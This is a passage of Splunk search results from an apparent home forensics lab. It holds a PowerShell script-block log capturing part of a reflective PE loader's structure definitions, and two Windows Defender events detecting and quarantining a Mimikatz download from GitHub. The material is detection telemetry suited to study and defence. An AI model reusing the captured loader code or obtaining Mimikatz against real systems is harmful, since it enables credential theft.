[UInt16], 'Public') | Out-Null\n\t\t$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null\n\t\t$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null\n\t\t$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null\n\t\t$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null\n\t\t$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null\n\t\t$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()\n\t\t$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER\n\n\t\t#Struct IMAGE_OPTIONAL_HEADER64\n\t\t$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'\n\t\t$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)\n\t\t($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null\n\t\t($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null\n\t\t($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null\n\t\t($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null\n\t\t($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null\n\t\t($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null\n\t\t($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null\n\t\t($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null\n\t\t($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null\n\t\t($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null\n\t\t($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null\n\t\t($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null\n\t\t($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null\n\t\t($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null\n\t\t($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null\n\t\t($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null\n\t\t($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null\n\t\t($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null\n\t\t($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null\n\t\t($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null\n\t\t($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null\n\t\t($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null\n\t\t($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null\n\t\t($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null\n\t\t($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null\n\t\t($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null\n\t\t($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null\n\t\t($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null\n\t\t($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null\n\t\t($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null\n\t\t($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null\n\t\t($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null\n\t\t($TypeBuilde\n79490727-fa2f-46e6-bf60-bef62708dfb5","_time":"2025-11-23T14:38:46.645+0000","category":"Execute","dvc":"DESKTOP-78CU07R","dvc_nt_host":"DESKTOP-78CU07R","event_id":"108","eventtype":["endpoint_services_processes","windows_event_signature","windows_ta_data"],"host":"DESKTOP-78CU07R","id":"108","index":"mydfir-project","linecount":"270","punct":"//_::._=--/===-==-------==--====___=__=________.__","severity":"medium","severity_id":"3","signature_id":"4104","source":"Microsoft-Windows-PowerShell/Operational","sourcetype":"WinEventLog","splunk_server":"chalitha-splunk","tag":"track_event_signatures","tag::eventtype":"track_event_signatures","vendor_product":"Microsoft Windows"}}
{"preview":false,"result":{"ComputerName":"DESKTOP-78CU07R","EventCode":"1117","EventType":"4","Keywords":"None","LogName":"Microsoft-Windows-Windows","Message":"Microsoft","OpCode":"Info","RecordNumber":"297","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Windows","TaskCategory":"None","Type":"Information","User":"NOT_TRANSLATED","_raw":"11/23/2025 08:22:12.118 AM\nLogName=Microsoft-Windows-Windows Defender/Operational\nEventCode=1117\nEventType=4\nComputerName=DESKTOP-78CU07R\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Windows Defender\nType=Information\nRecordNumber=297\nKeywords=None\nTaskCategory=None\nOpCode=Info\nMessage=Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/Mimikatz&threatid=2147686744&enterprise=0\r\n \tName: HackTool:Win32/Mimikatz\r\n \tID: 2147686744\r\n \tSeverity: High\r\n \tCategory: Tool\r\n \tPath: file:_C:\\Users\\chalitha\\Downloads\\Unconfirmed 548256.crdownload; webfile:_C:\\Users\\chalitha\\Downloads\\Unconfirmed 548256.crdownload|https://release-assets.githubusercontent.com/github-production-release-asset/18496166/28e3acb5-ca66-40d5-bc68-f76f5bfabecf?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-11-23T15{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A07{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A03Z&rscd=attachment{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}B+filename{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}Dmimikatz_trunk.zip&rsct=application4.18.25100.9008Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-11-23T14{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A06{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A46Z&ske=2025-11-23T15{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A07{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A03Z&sks=b&skv=2018-11-09&sig=c4.18.25100.9008BgglADSB2CHu4edt6MPzc0aKAXNMi59vi3S2Ztd7Wk{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc2MzkwODAyNiwibmJmIjoxNzYzOTA3NzI2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.L4ymMr8hYNM4ztl3yxqt4qE1UBYEch3o8001NLWfV-w&response-content-disposition=attachment{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}BDESKTOP-78CU07R\\chalithafilename{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}Dmimikatz_trunk.zip&response-content-type=ap\r\n \tDetection Origin: Internet\r\n \tDetection Type: Concrete\r\n \tDetection Source: Downloads and attachments\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: Unknown\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.441.427.0, AS: 1.441.427.0, NIS: 1.441.427.0\r\n \tEngine Version: AM: 1.1.25100.9002, NIS: 1.1.25100.9002","_time":"2025-11-23T14:22:12.118+0000","category":"None","dvc":"DESKTOP-78CU07R","dvc_nt_host":"DESKTOP-78CU07R","enterprise":"0","event_id":"297","eventtype":["endpoint_services_processes","windows_event_signature","windows_ta_data"],"host":"DESKTOP-78CU07R","id":"297","index":"mydfir-project","jwt":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc2MzkwODAyNiwibmJmIjoxNzYzOTA3NzI2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.L4ymMr8hYNM4ztl3yxqt4qE1UBYEch3o8001NLWfV-w","linecount":"33","linkid":"37020","name":"HackTool:Win32/Mimikatz","punct":"//_::._=--_/===-==---==--_======________________.\\r","response_content_disposition":"attachment{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}BDESKTOP-78CU07R\\chalithafilename{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}Dmimikatz_trunk.zip","response_content_type":"ap","rscd":"attachment{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}B+filename{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}Dmimikatz_trunk.zip","rsct":"application4.18.25100.9008Foctet-stream","se":"2025-11-23T15{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A07{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A03Z","severity":"informational","severity_id":"4","sig":"c4.18.25100.9008BgglADSB2CHu4edt6MPzc0aKAXNMi59vi3S2Ztd7Wk{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}D","signature_id":"1117","ske":"2025-11-23T15{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A07{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A03Z","skoid":"96c2d410-5711-43a1-aedd-ab1947aa7ab0","sks":"b","skt":"2025-11-23T14{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A06{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A46Z","sktid":"398a6654-997b-47e9-b12b-9515b896b4de","skv":"2018-11-09","source":"Microsoft-Windows-Windows Defender/Operational","sourcetype":"WinEventLog","sp":"r","splunk_server":"chalitha-splunk","spr":"https","sr":"b","sv":"2018-11-09","tag":"track_event_signatures","tag::eventtype":"track_event_signatures","threatid":"2147686744","vendor_product":"Microsoft Windows"}}
{"preview":false,"lastrow":true,"result":{"ComputerName":"DESKTOP-78CU07R","EventCode":"1116","EventType":"3","Keywords":"None","LogName":"Microsoft-Windows-Windows","Message":"Microsoft","OpCode":"Info","RecordNumber":"296","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Windows","TaskCategory":"None","Type":"Warning","User":"NOT_TRANSLATED","_raw":"11/23/2025 08:22:07.144 AM\nLogName=Microsoft-Windows-Windows Defender/Operational\nEventCode=1116\nEventType=3\nComputerName=DESKTOP-78CU07R\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Windows Defender\nType=Warning\nRecordNumber=296\nKeywords=None\nTaskCategory=None\nOpCode=Info\nMessage=Microsoft Defender Antivirus has detected malware or other potentially unwanted software.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/Mimikatz&threatid=2147686744&enterprise=0\r\n \tName: HackTool:Win32/Mimikatz\r\n \tID: 2147686744\r\n \tSeverity: High\r\n \tCategory: Tool\r\n \tPath: file:_C:\\Users\\chalitha\\Downloads\\Unconfirmed 548256.crdownload; webfile:_C:\\Users\\chalitha\\Downloads\\Unconfirmed 548256.crdownload|https://release-assets.githubusercontent.com/github-production-release-asset/18496166/28e3acb5-ca66-40d5-bc68-f76f5bfabecf?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-11-23T15{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A07{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A03Z&rscd=attachment{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}B+filename{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}Dmimikatz_trunk.zip&rsct=application4.18.25100.9008Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-11-23T14{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A06{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A46Z&ske=2025-11-23T15{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A07{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A03Z&sks=b&skv=2018-11-09&sig=c4.18.25100.9008BgglADSB2CHu4edt6MPzc0aKAXNMi59vi3S2Ztd7Wk{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc2MzkwODAyNiwibmJmIjoxNzYzOTA3NzI2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.L4ymMr8hYNM4ztl3yxqt4qE1UBYEch3o8001NLWfV-w&response-content-disposition=attachment{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}BDESKTOP-78CU07R\\chalithafilename{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}Dmimikatz_trunk.zip&response-content-type=ap\r\n \tDetection Origin: Internet\r\n \tDetection Type: Concrete\r\n \tDetection Source: Downloads and attachments\r\n \tUser: DESKTOP-78CU07R\\chalitha\r\n \tProcess Name: Unknown\r\n \tSecurity intelligence Version: AV: 1.441.427.0, AS: 1.441.427.0, NIS: 1.441.427.0\r\n \tEngine Version: AM: 1.1.25100.9002, NIS: 1.1.25100.9002","_time":"2025-11-23T14:22:07.144+0000","category":"None","dvc":"DESKTOP-78CU07R","dvc_nt_host":"DESKTOP-78CU07R","enterprise":"0","event_id":"296","eventtype":["endpoint_services_processes","windows_event_signature","windows_ta_data"],"host":"DESKTOP-78CU07R","id":"296","index":"mydfir-project","jwt":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc2MzkwODAyNiwibmJmIjoxNzYzOTA3NzI2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.L4ymMr8hYNM4ztl3yxqt4qE1UBYEch3o8001NLWfV-w","linecount":"29","linkid":"37020","name":"HackTool:Win32/Mimikatz","punct":"//_::._=--_/===-==---==--_======__________.\\r______","response_content_disposition":"attachment{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}BDESKTOP-78CU07R\\chalithafilename{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}Dmimikatz_trunk.zip","response_content_type":"ap","rscd":"attachment{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}B+filename{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}Dmimikatz_trunk.zip","rsct":"application4.18.25100.9008Foctet-stream","se":"2025-11-23T15{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A07{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A03Z","severity":"medium","severity_id":"3","sig":"c4.18.25100.9008BgglADSB2CHu4edt6MPzc0aKAXNMi59vi3S2Ztd7Wk{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}D","signature_id":"1116","ske":"2025-11-23T15{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A07{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A03Z","skoid":"96c2d410-5711-43a1-aedd-ab1947aa7ab0","sks":"b","skt":"2025-11-23T14{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A06{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A46Z","sktid":"398a6654-997b-47e9-b12b-9515b896b4de","skv":"2018-11-09","source":"Microsoft-Windows-Windows Defender/Operational","sourcetype":"WinEventLog","sp":"r","splunk_server":"chalitha-splunk","spr":"https","sr":"b","sv":"2018-11-09","tag":"track_event_signatures","tag::eventtype":"track_event_signatures","threatid":"2147686744","vendor_product":"Microsoft Windows"}}
